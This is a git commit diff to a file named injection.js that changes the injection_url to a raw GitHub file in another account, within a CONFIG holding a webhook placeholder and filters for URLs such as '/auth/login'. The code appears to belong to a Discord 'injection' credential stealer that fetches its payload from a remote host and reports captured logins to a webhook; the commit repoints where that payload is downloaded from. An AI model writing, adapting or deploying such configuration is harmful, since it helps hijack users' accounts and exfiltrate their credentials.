a3873b97505dabbac4c4aea67c469b277308db78
Itinho <75649702+itinhoz@users.noreply.github.com>
2024-11-08 19:02:19 -0300

    Update injection.js

--- injection.js
+++ injection.js
@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/itinhoz/d/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
